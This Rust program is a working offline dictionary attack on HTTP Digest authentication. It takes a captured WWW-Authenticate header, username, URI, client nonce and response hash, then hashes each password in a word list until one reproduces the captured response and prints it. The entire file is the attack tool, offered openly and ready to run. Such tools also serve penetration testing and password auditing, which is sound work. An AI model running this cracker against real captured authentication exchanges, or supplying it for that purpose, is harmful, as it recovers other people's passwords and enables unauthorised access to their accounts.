use std::{
    fs::File,
    io::{self, BufRead, BufReader},
};

use digest_auth::AuthContext;
fn main() {
    let reader = if let Ok(dictinary) = File::open("dictionary.txt") {
        BufReader::new(dictinary)
    } else {
        println!("dictionary.txt not found");
        return;
    };

    let stdin = io::stdin();
    let mut iterator = stdin.lock().lines();
    println!("Insert WWW-Authenticate Value");
    let prompt = loop {
        if let Some(Ok(www_authenticate)) = iterator.next() {
            if let Ok(prompt) = digest_auth::parse(&www_authenticate) {
                break prompt;
            }
        }
        println!("Error: WWW-Authenticate Invalid");
        continue;
    };
    println!("Insert Username");
    let username = loop {
        if let Some(Ok(username)) = iterator.next() {
            break username;
        }
        println!("Error: Username Invalid");
        continue;
    };

    println!("Insert URI");
    let path = loop {
        if let Some(Ok(username)) = iterator.next() {
            break username;
        }
        println!("Error: URI Invalid");
        continue;
    };
    println!("Insert Client Nonce");
    let cn = loop {
        if let Some(Ok(username)) = iterator.next() {
            break username;
        }
        println!("Error: Client Nonce Invalid");
        continue;
    };
    println!("Insert Response Hash");

    let res = loop {
        if let Some(Ok(username)) = iterator.next() {
            if username.len() == 32 {
                break username;
            }
        }
        println!("Error: Response Hash Invalid");
        continue;
    };
    println!("\nAttack Started\n");
    for pass in reader.lines() {
        if let Ok(password) = pass {
            let mut context = AuthContext::new(&username, &password, &path);
            context.set_custom_cnonce(&cn);
            let answer = prompt.clone().respond(&context).unwrap().response;
            if res == answer {
                println!("Password Found: {}", password);
                return;
            }
        }
    }
    println!("Password is not in your dictionary")
}
